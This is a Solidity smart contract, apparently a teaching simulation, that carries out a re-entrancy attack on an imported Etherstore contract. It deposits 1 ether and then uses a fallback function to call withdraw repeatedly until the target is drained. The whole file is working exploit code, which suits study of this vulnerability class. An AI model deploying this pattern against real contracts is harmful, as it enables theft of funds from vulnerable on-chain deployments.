// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Etherstore.sol"; 

/**
 * @title Contract to simulate a re-entrancy attack.
 */
contract Attack {

    Etherstore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = Etherstore(_etherStoreAddress);
    }

    /**
     * @notice This funcion is called every time some ether is send to the contract.
     * @dev The intention is to use this fallback function to resend a transaction for withdraw
     * Basically a re-entrancy attack
     */
    fallback() external payable  {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
        
    /**
     * @notice Deposit 1 ether and then send a request for withdraw. 
     * @dev The start point to the attack, this function along with the fallback, 
     * will cause a re-entrancy attack.
     */
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
}